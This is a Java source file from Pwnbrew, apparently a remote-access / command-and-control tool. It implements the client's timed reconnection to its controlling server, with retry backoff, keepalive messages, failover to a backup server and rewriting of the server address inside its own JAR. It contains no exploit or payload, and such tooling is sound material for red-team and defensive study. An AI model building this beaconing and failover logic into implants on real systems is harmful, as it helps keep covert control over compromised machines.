/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/


/*
 *  ReconnectTimer.java
 *
 *  Created on June 7, 2013
 */

package pwnbrew.utilities;

import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.UnknownHostException;
import java.nio.channels.AlreadyConnectedException;
import java.nio.channels.SelectionKey;
import java.nio.channels.SocketChannel;
import java.text.ParseException;
import java.util.Calendar;
import java.util.Date;
import java.util.EmptyStackException;
import java.util.LinkedList;
import java.util.Queue;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.TimeoutException;
import java.util.logging.Level;
import pwnbrew.ClientConfig;
import pwnbrew.log.LoggableException;
import pwnbrew.log.RemoteLog;
import pwnbrew.manager.DataManager;
import pwnbrew.manager.OutgoingConnectionManager;
import pwnbrew.manager.PortManager;
import pwnbrew.network.ClientPortRouter;
import pwnbrew.network.ConnectionCallback;
import pwnbrew.network.Message;
import pwnbrew.network.control.messages.NoOp;
import pwnbrew.selector.ConnectHandler;
import pwnbrew.selector.SelectionRouter;
import pwnbrew.selector.SocketChannelHandler;

/**
 *
 *  
 */
public class ReconnectTimer extends ManagedRunnable {
    
    private final PortManager theCommManager;
    private Message postConnectMsg = null;
    
    private Date initialSleepDateStr = null;
    private final Queue<String> theReconnectTimeList = new LinkedList<>();    
    
    private static final String NAME_Class = ReconnectTimer.class.getSimpleName();
    private String backupServerIp = null;
    private int backupServerPort = -1;
    
    private final int theChannelId;
    private ConnectionCallback theConnectionCallback = null;
    
    //Used to disable reconnect timer
    private boolean enabled = true;
           
    private static final int CONNECT_RETRY = 3;
    private static final int RETRY_TIME = 1000;
    
    private SocketChannel theSocketChannel;

    // ==========================================================================
    /**
     * Constructor
     *
     * @param passedManager
     * @param channelId
    */
    public ReconnectTimer( PortManager passedManager, int channelId ) {
        super(Constants.Executor);
        theCommManager = passedManager;
        theChannelId = channelId;
    }
    
    // ==========================================================================
    /**
     *   Sets the message to be queued after connection
     * @param passedMsg
    */
    public synchronized void setPostConnectMessage( Message passedMsg ) {

        postConnectMsg = passedMsg;  
        
    }
    
     // ==========================================================================
    /**
     *   Sets the IP address for the backup server
     * @param passedIp
    */
    public synchronized void setBackupServerIp( String passedIp ) {

        backupServerIp = passedIp;  
        
    }/* END setBackupServerIp() */
    
       // ==========================================================================
    /**
     *   Sets the IP address for the backup server
     * @param passedPort
    */
    public synchronized void setBackupServerPort( int passedPort ) {

        backupServerPort = passedPort;  
        
    }/* END setBackupServerPort() */
    
    // ==========================================================================
    /**
     *   Sets the enabled flag
     * @param passedBool
    */
    public synchronized void setEnabled( boolean passedBool ) {
        enabled = passedBool;       
    }

    //==============================================================
    /**
     * Set the initial sleep date
     * 
     * @param passedDate 
     */
    public void setSleepDateStr(Date passedDate) {
        initialSleepDateStr = passedDate;
    }    
    
    //===============================================================
     /**
     * Recursive function for connecting to the server
     *
     * @return
     * @throws IOException
    */
    private boolean connect( ClientPortRouter aPR, int channelId, InetAddress hostAddress, int passedPort ) throws LoggableException {

        OutgoingConnectionManager theOCM = aPR.getConnectionManager();
        try {
            // Create a non-blocking socket channel
            theSocketChannel = SocketChannel.open();
        } catch (IOException ex) {
            DebugPrinter.printMessage( NAME_Class, "Error opening socket.");
            return false;
        }
        
        //Make the socket non blocking
        try {
            theSocketChannel.configureBlocking(false);
        } catch (IOException ex) {
            try{
                theSocketChannel.close();
            } catch (IOException ex1) {}
            DebugPrinter.printMessage( NAME_Class, "Error setting non blocking socket.");
            return false;
        }

        // Kick off connection establishment
        try {
            theSocketChannel.connect(new InetSocketAddress(hostAddress, passedPort));
        } catch( AlreadyConnectedException ex ) {
            DebugPrinter.printMessage( NAME_Class, "Socket is already connected.");
            return true;
        } catch (IOException ex) {
            //Close the socket so it's not left in a half open state
            try{
                theSocketChannel.close();
            } catch (IOException ex1) {}
            DebugPrinter.printMessage( NAME_Class, "Error connecting socket.");
            return false;
        }

        // Register the server socket channel, indicating an interest in
        // accepting new connections
        ConnectHandler connectHandler = new ConnectHandler( aPR, channelId );

        // Register the socket channel and handler with the selector
        SelectionRouter theSelectionRouter = aPR.getSelRouter();
        SelectionKey theSelKey;
        try {
            theSelKey = theSelectionRouter.register(theSocketChannel, SelectionKey.OP_CONNECT, connectHandler);
        } catch (IOException ex) {
            //Close the socket so it's not left in a half open state
            try{
                theSocketChannel.close();
            } catch (IOException ex1) {}
            DebugPrinter.printMessage( NAME_Class, "Error registering socket channel with connect handler.");
            return false;
        }

        try {
            //Wait until the thread is notified or times out
            waitToBeNotified(5000);
        } catch (TimeoutException ex) {
            
            //Unregister the channel
            theSelectionRouter.unregister(theSocketChannel);
            
            //Close the socket so it's not left in a half open state
            //try{
            //    theSocketChannel.close();
            //} catch (IOException ex1) {}
            
            
            DebugPrinter.printMessage( NAME_Class, "Socket connect timeout exception channel " + Integer.toString(channelId));
            return false;
        }

        //Return if the key was cancelled
        if(!theSelKey.isValid()){
            //Close the socket so it's not left in a half open state
//            try{
//                theSocketChannel.close();
//            } catch (IOException ex1) {}

            theSelKey.cancel();
            return false;
        }

        //If we returned but we are not connected
        SocketChannelHandler theSCH = theOCM.getSocketChannelHandler( channelId );
        if( theSCH == null){ 
            DebugPrinter.printMessage( NAME_Class, "SocketChannelHandler is null.");
            return false;

        } else if (theSCH.getState() == Constants.DISCONNECTED){
            DebugPrinter.printMessage( NAME_Class, "SocketChannelHandler is disconnected, channel " + Integer.toString(channelId));
            return false;                
        }

        return true;
    }
    
    //===============================================================
    /**
    * Adds an event for the selector that the client is interested in opening
    * a connection.
    *
    * @return
    * @throws IOException
    */
    private boolean initiateConnection( ClientPortRouter aPR, int channedId, InetAddress hostAddress, int passedPort, int retry ) throws LoggableException {

        int sleepTime = RETRY_TIME;
        boolean connected = false;
           
        while( retry > 0 && !connected && !shutdownRequested){

            connected =  connect( aPR, channedId, hostAddress, passedPort );

            //Sleep if not connected
            if(!connected){
                try {                    
                    //Intentially sleeping with lock held so there are no other attempts to
                    //connect to the server during this loop.
                    DebugPrinter.printMessage( NAME_Class, "Sleeping because of no connection. channel id " + Integer.toString(channedId));

                    Thread.sleep(sleepTime);
                } catch (InterruptedException ex) {
                    ex = null;
                }

                //Update counters and test
                sleepTime += sleepTime;  
                retry--;

            } else {
                //DebugPrinter.printMessage( NAME_Class, "Connection made on channel " + Integer.toString(channedId));
            }

        }

        return connected;
    }
    
     //===============================================================
    /**
     * Checks that a connection has been made to the passed port.  If not it
     * creates one.
     *
     * @param aPR
     * @param passedCallback
     * @param passedIdArr 
    */
    public void ensureConnectivity( ClientPortRouter aPR, ConnectionCallback passedCallback, Integer... passedIdArr ) {

        int channelId = 1;
        int passedPort = passedCallback.getPort();
        String serverIp = passedCallback.getServerIp();
        OutgoingConnectionManager theOCM = aPR.getConnectionManager();
        try {
            
            //Get the channelId
            if( passedIdArr.length > 0){
                channelId = passedIdArr[0];
            } else {
                channelId = theOCM.getNextChannelId();
            }
            
            //Get the handler               
            SocketChannelHandler aSC = theOCM.getSocketChannelHandler( channelId );
            if(aSC != null && aSC.getState() == Constants.CONNECTED){
                DebugPrinter.printMessage(NAME_Class, "Connection already made channel " + Integer.toString(channelId));
                return;                    
            }
           
            //Get the inet
            InetAddress srvInet = InetAddress.getByName(serverIp);
            //DebugPrinter.printMessage( NAME_Class, "Attempting to connect to " + srvInet.getHostAddress() + ":" + passedPort);

            //Set the callback
            if( !initiateConnection( aPR, channelId, srvInet, passedPort, CONNECT_RETRY )){

                if( !shutdownRequested ){
                    DebugPrinter.printMessage( NAME_Class, "Unable to connect to port.");
                    if( channelId != OutgoingConnectionManager.COMM_CHANNEL_ID)
                        RemoteLog.log(Level.INFO, NAME_Class, "ensureConnectivity()", "Unable to connect to port " + passedPort + " channel " + Integer.toString(channelId), null );
                } 
                
                passedCallback.handleConnection(0);

            } else {


                aSC = theOCM.getSocketChannelHandler( channelId );
                if( aSC == null || aSC.getState() == Constants.DISCONNECTED ){

                    DebugPrinter.printMessage( NAME_Class, "Not connected.");
                    passedCallback.handleConnection(0);

                } else {                        
                    passedCallback.handleConnection(channelId);                     
                }
            }
        
     
        } catch ( EmptyStackException | UnknownHostException | LoggableException ex) {
            
            if( channelId != OutgoingConnectionManager.COMM_CHANNEL_ID)
                RemoteLog.log(Level.INFO, NAME_Class, "ensureConnectivity()", ex.getMessage(), ex );
            
            //Call handler
            passedCallback.handleConnection(0);
        }
        
    }  
     
    // ==========================================================================
    /**
     *  Main thread loop
     *
    */
    @Override
    public void go() {
        
        int connected = 0;
        shutdownRequested = false;
              
        //DebugPrinter.printMessage(NAME_Class, "ReconnectTimer started for channel " + Integer.toString(theChannelId));
        //Get the socket router
        ClientConfig theConf = ClientConfig.getConfig();
        String serverIp = theConf.getServerIp();
        int thePort = ClientConfig.getConfig().getSocketPort();
        ClientPortRouter aPR = (ClientPortRouter) theCommManager.getPortRouter( thePort );
        if(aPR == null){
            DebugPrinter.printMessage(NAME_Class, "No port router. Aborting.");
            return;     
        }    
        
        //Shutdown and remove
        if(enabled == false){
            //Cleanup socket handlers and remove reconnect timer
            OutgoingConnectionManager theOCM = aPR.getConnectionManager();
            SocketChannelHandler aSCH = theOCM.removeHandler(theChannelId);
            if( aSCH != null )
                aSCH.shutdown();
            
            //Remove the reconnect timer
            DebugPrinter.printMessage(NAME_Class, "Removing reconnect timer for channel " + theChannelId);
            theOCM.removeReconnectTimer(theChannelId);            
            
            return;
        }
                
        //Set the connection callback
        ConnectionCallback aCC;
        if(theConnectionCallback != null)
            aCC = theConnectionCallback;
        else 
            aCC = new ConnectionCallback(serverIp, thePort, this);        
        
        //Set the reconnect timer
        aPR.getConnectionManager().setReconnectTimer( theChannelId, this );
        try {                 
            
            Date theDate;
            if( initialSleepDateStr == null ){
                Calendar theCalendar = Calendar.getInstance(); 
                theCalendar.setTime( new Date() );
                theCalendar.add(Calendar.SECOND, 5 );
                theDate = theCalendar.getTime();
            } else {
                theDate = initialSleepDateStr;
                initialSleepDateStr = null;                
            }
            
            while( connected == 0 && !shutdownRequested ){
            
                String reconnectTime;
                synchronized(theReconnectTimeList){
                    reconnectTime = theReconnectTimeList.poll();
                }
                
                //Get the reconnect time from the list
                if( reconnectTime != null ){

                    try {
                        theDate = Constants.CHECKIN_DATE_FORMAT.parse( reconnectTime ); 
                    } catch (NumberFormatException ex ){
                        ex = null;
                        continue;
                    } 
                    
                    //check if the time is before now
                    Calendar anotherCalendar = Calendar.getInstance(); 
                    anotherCalendar.setTime( theDate );
                    if( anotherCalendar.before( new Date())){                        
                        //Initialize the time
                        continue;                   
                    }                   
                    
                }        
            
                //Wait till a certain time
                if( theDate != null ){
                    
                    //DebugPrinter.printMessage(NAME_Class, "Retrying again at: " + Constants.CHECKIN_DATE_FORMAT.format(theDate));
               
                    waitUntil(theDate);  
                    try {
                        ensureConnectivity( aPR, aCC, theChannelId );
                    } catch(RuntimeException ex){
                        continue;
                    }
                    
                    try {
                        //DebugPrinter.printMessage(NAME_Class, "ReconnectTimer waiting to be notified.");
                        waitToBeNotified(5000);
                    } catch (TimeoutException ex) {                        
                    }
                    
                    if( shutdownRequested)
                        return;
                    
                    //Get the channel id and try again if connection failed
                    connected = aCC.getChannelId();
                    if( connected == 0){
                        DebugPrinter.printMessage(NAME_Class, "Notified, but no connection. Trying again later.");
                        continue;
                    }
                    
                    //Queue post connect msg if it exists
                    if( postConnectMsg != null){
                        DataManager.send( theCommManager, postConnectMsg );
                        postConnectMsg = null;
                    }                    

                    //DebugPrinter.printMessage(NAME_Class, "ReconnectTimer notified. Connected: " + connected);
                    theDate = null;
                    
                    //Send & Receive message
                    SocketChannelHandler aSCH =  aPR.getConnectionManager().getSocketChannelHandler(connected);
                    if( aSCH != null ){
                        if(aSCH.getQueueSize() == 0 ){
                            NoOp aNoOp = new NoOp();
                            aNoOp.setChannelId(connected);
                            DataManager.send( theCommManager, aNoOp);    
                        }
                        aSCH.signalSend();
                    } else {
                        DebugPrinter.printMessage(NAME_Class, "SocketChannelHandler is null");
                        connected = 0;
                    }
                   
                } else  {
                    DebugPrinter.printMessage(NAME_Class, "Reached reconnect limit. exiting");
                    break;
                }
                
            }
            
        } catch (ParseException ex) {
            RemoteLog.log(Level.SEVERE, NAME_Class, "start()", ex.getMessage(), ex);
        }
        
        //Check if there is an alternate server IP/Port
        if( backupServerIp != null && backupServerPort != -1 ){
            
            //Set the connection callback
            if(theConnectionCallback == null)
                aCC = new ConnectionCallback(backupServerIp, backupServerPort, this); 
            
            ensureConnectivity(aPR, aCC, theChannelId);
            try {
                waitToBeNotified(5000);
            } catch (TimeoutException ex) {
            }
            
            if( shutdownRequested)
                return;

            //Get the channel id
            connected = aCC.getChannelId();
            if( connected != 0 ){

                theConf.setServerIp(backupServerIp);
                theConf.setSocketPort( Integer.toString( backupServerPort ));

                try {
                    //Set JAR conf back to old IP
                    Utilities.updateServerInfoInJar(backupServerIp +":"+ Integer.toString( backupServerPort));
                } catch (ClassNotFoundException | IOException ex) {
                    if( theChannelId != OutgoingConnectionManager.COMM_CHANNEL_ID)
                        RemoteLog.log(Level.SEVERE, NAME_Class, "go()", ex.getMessage(), ex);
                }

                //Reset things
                theReconnectTimeList.clear();
                backupServerIp = null;
                backupServerPort = -1;
                return;
            }               
        }
        
        //Close the socket if the thread is being shutdown
        if( shutdownRequested || enabled == false){
            try {
                theSocketChannel.close();
            } catch (IOException ex) {}
        }
        
        //DebugPrinter.printMessage(NAME_Class, "Thread complete channel " + Integer.toString(theChannelId));
     
        //Reset things
        theConnectionCallback = null;
        theReconnectTimeList.clear();
        backupServerIp = null;
        backupServerPort = -1;
        
    }
    
    // ==========================================================================
    /**
     *  Wait until a certain date to reconnect
     * 
     * @param date 
     */
    private void waitUntil(Date date) {
        
        final Object syncedObject = new Object();
        TimerTask aTimerTask = new TimerTask() {
            @Override
            public void run() {
                synchronized (syncedObject) {
                    syncedObject.notifyAll();
                }
            }
        };
        
        //DebugPrinter.printMessage(NAME_Class, "Trying to connect again at " + date.toString());
        //Create a timer
        Timer aTimer = new Timer();
        try {
            aTimer.schedule(aTimerTask, date);

            synchronized(syncedObject) {
                try {
                    syncedObject.wait();
                } catch (InterruptedException ie) {
                }
            }
            aTimer.cancel();
            aTimer.purge();
            
        } catch( IllegalArgumentException ex){
            DebugPrinter.printMessage(NAME_Class, "Improper reconenct  date: " + date.toString() + " returning immediately.");
        }
    }

    // ==========================================================================
    /**
     *  Sets the delay to wait before trying to connect.
     * 
     * @param passedTime 
    */
    public void addReconnectTime( String passedTime ) {
        synchronized(theReconnectTimeList){
            theReconnectTimeList.add( passedTime );
        }
    }
  
    //===============================================================
    /**
     * 
     */
    public void clearTimes() {
        synchronized(theReconnectTimeList){
            theReconnectTimeList.clear();
        }
    }

    //===============================================================
    /**
     * 
     * @param aCC
     */
    public void setConnectionCallback(ConnectionCallback aCC) {
        theConnectionCallback = aCC;
    }
    
    //===============================================================
    /**
    *  Shut down the detector
    */
    @Override
    public void shutdown(){
        super.shutdown();
        enabled = false;
    }

}
